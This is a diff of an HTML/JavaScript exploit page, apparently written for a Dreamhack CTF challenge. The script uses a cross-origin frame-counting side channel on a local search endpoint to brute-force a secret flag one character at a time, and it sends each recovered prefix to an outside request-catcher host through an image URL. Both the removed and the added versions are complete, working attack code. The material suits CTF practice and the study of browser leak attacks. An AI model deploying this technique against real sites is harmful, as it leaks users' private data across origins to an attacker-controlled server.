@@ -2,71 +2,31 @@
 <img id="img">
 
 <script>
+async function searchChar(data) {
+    return new Promise((resolve) => {
+        iframe.src = "http://127.0.0.1:8000/search?query=" + data;
+        iframe.onload = () => {
+            resolve(iframe.contentWindow.frames.length > 0);
+        };
+    });
+}
 
+const iframe = document.getElementById("iframe");
+const img = document.getElementById("img");
+const chars = "0123456789abcdef}";
+let flag = "DH{";
 
-    async function req(url) {
-
-        return await new Promise((resolve, reject) => {
-
-            const iframe = document.getElementById("iframe");
-            iframe.src = url;
-
-            iframe.onload = () => {
-
-                if(iframe.contentWindow.frames.length == 1) {
-
-                    resolve();
-
-                }
-                else {
-
-                    reject();
-
-                }
-
-            };
-
-        });
-
-    }
-
-    async function search(query) {
-
-        try {
-
-            await req(`http://127.0.0.1:8000/search?query=${query}`);
-            return true;
-
-        } catch (e) {
-
-            return false;
-
-        }
-
-    }
-
-    async function exploit() {
-
-        let str = "0123456789abcdef}";
-        let FLAG = "DH{";
-
-        while(!FLAG.includes("}")) {
-
-            for(let ch of str) {
-
-                if(await search(FLAG+ch)) {
-
-                    FLAG += ch;
-                    img.src = `https://wvndpqo.request.dreamhack.games/${FLAG}`;
-                    break;
-
-                }
-
+async function findFlag() {
+    while (flag.length <= 35) {
+        for (let i = 0; i < chars.length; i++) {
+            if (await searchChar(flag + chars[i])) {
+                flag += chars[i];
+                img.src = "https://gcjbpbm.request.dreamhack.games?flag=" + flag;
+                break;
             }
-
         }
-
     }
-    exploit();
+}
 
+findFlag();
 </script>
